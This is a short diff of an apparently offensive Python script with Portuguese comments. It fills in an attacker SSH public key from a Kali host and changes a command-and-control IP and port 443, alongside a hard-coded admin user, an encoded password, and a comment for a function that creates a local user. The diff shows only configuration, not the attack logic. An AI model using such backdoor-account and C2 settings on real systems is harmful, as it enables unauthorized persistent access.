@@ -6,8 +6,8 @@ import subprocess
 # Definição das variáveis
 user = "admin"
 passwd = "LW5zZW5oYUAxMjMK"
-ssh_key_pub = 'ssh-rsa XXXXXXXXXXXXXXXXXXX'
-c2_ip = "192.168.15.126"
+ssh_key_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0/ya0onIOmUBcfVBkjX6RdHAXKa5gUG7VY3xqiiS4fcfRdQ1etWdzMQqgIaSKxx7bZo5h2WfoN8Q9dHh1u/8x3vINCkhpkJ1xWPT+Xlp47Z/UGt9t+lqnbMGhEF4B5A7K8ybWvWzc4IIZkmhPHdz39i19xBpkIBEH3/ztJP6mNGU8ffZ94LW67kkVlNxVfB93Gf5HpqKtoMD7RpE+gm8TTuoNmPJT2Z2OCXVe1zQF60/VCIhKzWYb9XftjBk9bl6VHsKchSvFaKKxUmHhXr+twHvUvTfEcMmdnJTc2FeBhf3HCvjhlBxpBUVdJ2bn4nWr3xqJ9euuy/jje7BbvCpj4o9ivIGlV4cSXf3JLGq5jpWU2WweWUxCmEbUZCBFwQm52c2o58xxquWtMSmY3HY5QpgIbc5qQrkmQ5oy0vTVO2N0+Tk3Tsb3OO7d7RruYswBD1TpG1of58bXUq9RuEyvvX/LVHGpZOcLFbMBKYg/qJCsFnmSGfeSKeyijMC/pds= carlos@kali'
+c2_ip = "192.168.15.52"
 c2_port = "443"
 
 # Função para criar usuário local
